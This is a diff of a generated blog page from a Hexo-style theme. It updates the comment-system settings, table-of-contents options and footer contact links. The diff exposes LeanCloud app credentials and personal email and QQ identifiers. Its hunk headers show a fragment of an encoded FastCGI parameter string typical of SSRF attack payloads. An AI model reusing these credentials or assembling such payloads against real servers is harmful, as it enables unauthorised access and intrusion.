+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -2443,6 +2448,8 @@ ER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOC
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -2470,8 +2477,8 @@ ER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOC
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -2554,8 +2561,6 @@ ER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOC
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -2575,24 +2580,28 @@ ER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOC
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -2804,8 +2813,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
